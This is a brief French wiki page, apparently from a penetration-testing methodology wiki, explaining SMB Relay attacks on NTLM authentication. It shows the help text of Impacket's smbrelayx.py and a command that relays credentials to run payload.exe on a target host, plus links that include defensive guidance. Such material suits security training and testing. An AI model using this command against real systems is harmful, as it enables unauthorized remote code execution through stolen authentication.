---
title: SMB Relay
permalink: /SMB_Relay/
---

# SMB Relay

SMB Relay est une méthode d'attaque permettant de relayer une authentification NTLM pour s'authentifier auprès d'un service [SMB](/SMB "wikilink").

Outils
------

[Impacket](/Impacket "wikilink") propose un outil **smbrelayx.py**:

``` text
Impacket v0.9.13 - Copyright 2002-2015 Core Security Technologies

usage: smbrelayx.py [--help] [-h HOST] -e FILE
                    [-machine-account MACHINE_ACCOUNT]
                    [-machine-hashes LMHASH:NTHASH] [-domain DOMAIN]

For every connection received, this module will try to SMB relay that
connection to the target system or the original client

optional arguments:
  --help                show this help message and exit
  -h HOST               Host to relay the credentials to, if not it will relay
                        it back to the client
  -e FILE               File to execute on the target system
  -machine-account MACHINE_ACCOUNT
                        Domain machine account to use when interacting with
                        the domain to grab a session key for signing, format
                        is domain/machine_name
  -machine-hashes LMHASH:NTHASH
                        Domain machine hashes, format is LMHASH:NTHASH
  -domain DOMAIN        Domain FQDN or IP to connect using NETLOGON
```

Une utilisation simple est la suivante:

``` bash
smbrelayx.py -e payload.exe -h 10.33.1.1
```

Ceci executera le fichier payload.exe sur le serveur 10.33.1.1 si l'utilisateur qu'on relaie a les droits nécessaires.

Références
----------

### Liens externes

-   [SMBRelay avec python sur SANS](https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)
-   [SMB Relay sur carnal0wnage](http://carnal0wnage.attackresearch.com/2012/11/windows-7-and-smb-relay.html)
-   [Méthodes de défense sur skullsecurity](https://blog.skullsecurity.org/2008/ms08-068-preventing-smbrelay-attacks)
-   [MS08_068 + MS10_046 = FUN UNTIL 2018](http://room362.com/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/)

[Category:Méthodologies](/Category:Méthodologies "wikilink")
